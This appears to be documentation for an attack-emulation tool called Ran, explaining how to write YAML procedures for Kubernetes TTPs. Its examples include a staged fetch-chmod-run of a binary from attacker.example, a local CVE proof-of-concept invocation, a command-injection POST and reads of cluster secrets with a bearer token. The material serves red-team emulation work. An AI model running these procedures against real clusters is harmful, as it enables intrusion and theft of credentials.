# Writing Procedures

A TTP can declare one or more procedures — different ways to execute the same
technique. The operator (or agent) picks one at invocation time.

## Shell command

The simplest procedure: a shell command to run on the target.

```yaml
procedures:
  - key: kubectl
    command: kubectl get pods --token=${TOKEN} -n=${NS} --output=json
```

- `key` — display name for the procedure, shown in the UI and used as the procedure
  ID. Also sets the preferred tool: if `key` matches a known tool TTP (e.g. `curl`,
  `wget`), that tool's setup steps are prepended automatically.
- `command` — the shell command to execute. Parameter placeholders (`${VAR}`) are
  resolved at runtime.

### Local commands

Some procedures run on the **operator's machine** rather than inside the target pod.
Set `isLocal: true`:

```yaml
procedures:
  - key: python-poc
    isLocal: true
    command: python3 /opt/exploits/cve-2025-1974.py --target ${TARGET.IP}
```

## Structured K8s API request

Use `k8s_request:` to describe a Kubernetes API call. Ran materialises this into
a concrete `kubectl` or `curl` command at runtime, resolving the API server URL
and credentials automatically.

```yaml
procedures:
  - key: k8s-request
    k8s_request:
      api_server: ${API_SERVER}
      api: /api/v1
      resource: serviceaccounts
      namespace: ${NS}
      cluster_scoped: ${ALL_NS}
      query: limit=500
      token: ${TOKEN}
      use_ca: false
```

| Field | Description |
|---|---|
| `api_server` | Base URL of the Kubernetes API server |
| `api` | API group path (e.g. `/api/v1`, `/apis/apps/v1`) |
| `resource` | Resource type (e.g. `pods`, `secrets`) |
| `namespace` | Namespace to query; ignored if `cluster_scoped` is true |
| `cluster_scoped` | `true` to query all namespaces |
| `query` | Optional query string appended to the URL |
| `token` | Bearer token for authorisation |
| `use_ca` | Whether to validate the server CA certificate |

## Structured HTTP request

Use `http_request:` for arbitrary HTTP calls:

```yaml
procedures:
  - key: curl
    tool: curl
    http_request:
      method: POST
      url: http://${TARGET}:${PORT}/api/v1/diagnostics/run
      headers:
        Content-Type: application/json
      body: '{"command":"${CMD}"}'
```

| Field | Description |
|---|---|
| `method` | HTTP method (`GET`, `POST`, `PUT`, `DELETE`, …) |
| `url` | Full URL with parameter placeholders |
| `headers` | Map of header name → value |
| `body` | Request body string |

The `tool:` field on the procedure specifies which CLI tool should handle the
request (`curl`, `wget`). If omitted, Ran uses its built-in HTTP client.

## Step sequences

Use `steps:` for ordered multi-phase operations (download → compile → execute):

```yaml
procedures:
  - key: staged-exploit
    steps:
      - fetch:
          url: https://attacker.example/exploit
          dest: /tmp/exploit
      - chmod:
          path: /tmp/exploit
          mode: "0755"
      - run:
          command: /tmp/exploit --payload ${CMD}
```

Step types: `fetch`, `chmod`, `run`, `write`, `delete`. The runtime compiles the
steps into a shell snippet joined with `&&`.

## Multiple procedures in one TTP

List as many procedures as you want. The UI renders them as a selectable list.
Prefer offering at least two where practical — one using native Kubernetes tooling
(`kubectl`) and one that only requires network access (`curl`):

```yaml
procedures:
  - key: kubectl
    command: kubectl get secrets -n=${NS} --token=${TOKEN} -o json

  - key: curl
    http_request:
      method: GET
      url: ${API_SERVER}/api/v1/namespaces/${NS}/secrets
      headers:
        Authorization: "Bearer ${TOKEN}"
```
